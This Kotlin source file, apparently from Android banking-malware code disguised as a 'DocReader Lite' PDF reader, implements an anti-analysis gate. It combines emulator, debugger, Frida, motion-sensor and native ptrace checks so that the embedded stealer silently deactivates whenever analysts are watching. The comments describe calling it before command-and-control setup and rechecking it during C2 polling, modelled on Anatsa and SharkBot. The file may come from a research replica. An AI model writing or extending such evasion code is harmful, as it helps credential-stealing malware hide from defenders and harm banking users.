package com.docreader.lite.reader.engine

import android.content.Context
import com.docreader.lite.reader.advanced.MultiAxisSensor

/**
 * Environment gate — aggregates all anti-analysis checks.
 *
 * Real banker pattern: if ANY evasion check fires, stealer silently deactivates.
 * App looks innocent. No crashes, no errors, no suspicious behavior.
 * Analyst sees a normal PDF reader. Must defeat all vectors to observe stealer.
 *
 * Anatsa: checks on Application.onCreate() — before any stealer init.
 * SharkBot: re-checks periodically during C2 polling.
 */
object SafetyCheck {

    @Volatile
    var isSafe = false
        private set

    @Volatile
    var lastResult: CheckResult? = null
        private set

    data class CheckResult(
        val emulatorScore: Int,
        val emulatorFlags: List<String>,
        val isEmulator: Boolean,
        val debuggerAttached: Boolean,
        val tracerPid: Int,
        val timingAnomaly: Boolean,
        val fridaDetected: Boolean,
        val fridaPortOpen: Boolean,
        val fridaMapsHit: Boolean,
        val fridaFilesFound: List<String>,
        val fridaProcessFound: Boolean,
        // Multi-axis sensor (Drelock/Apex composition)
        val sensorIsReal: Boolean,
        val sensorFailReasons: List<String>,
        // Native anti-analysis (Klopatra/Virbox)
        val nativeCheckBitmask: Int,
    )

    /**
     * Run all checks. Call from Application.onCreate() BEFORE C2 init.
     * Returns true if environment is clean (no analysis detected).
     */
    fun evaluate(context: Context): Boolean {
        val emu = DeviceCheck.check(context)
        val dbg = RuntimeCheck.check()
        val frida = IntegrityCheck.check()

        // Multi-axis sensor check — runs on current thread (2s blocking)
        // Drelock/Apex: sensor data is hardest to fake on emulators
        val sensor = try {
            MultiAxisSensor.evaluate(context)
        } catch (_: Exception) {
            null
        }

        // Native anti-analysis (ptrace + Frida PLT hooks + /proc/self/maps)
        val nativeBitmask = NativeRuntime.antiAnalysisCheck()

        val result = CheckResult(
            emulatorScore = emu.score,
            emulatorFlags = emu.flags,
            isEmulator = emu.isEmulator,
            debuggerAttached = dbg.debuggerAttached,
            tracerPid = dbg.tracerPid,
            timingAnomaly = dbg.timingAnomaly,
            fridaDetected = frida.detected,
            fridaPortOpen = frida.portOpen,
            fridaMapsHit = frida.mapsHit,
            fridaFilesFound = frida.filesFound,
            fridaProcessFound = frida.processFound,
            sensorIsReal = sensor?.isRealDevice ?: true,
            sensorFailReasons = sensor?.failReasons ?: emptyList(),
            nativeCheckBitmask = nativeBitmask,
        )

        lastResult = result

        // Native bitmask: bit 0 = ptrace debugger, bit 1 = Frida hooks, bit 2 = suspicious maps
        val nativeClean = nativeBitmask == 0

        isSafe = !emu.isEmulator &&
            !dbg.debuggerAttached &&
            !frida.detected &&
            (sensor?.isRealDevice ?: true) &&
            nativeClean

        return isSafe
    }

    /**
     * Periodic re-check — SharkBot pattern.
     * Called from C2 poll loop. If environment becomes hostile mid-session,
     * stealer shuts down silently.
     */
    fun recheck(context: Context): Boolean {
        return evaluate(context)
    }
}
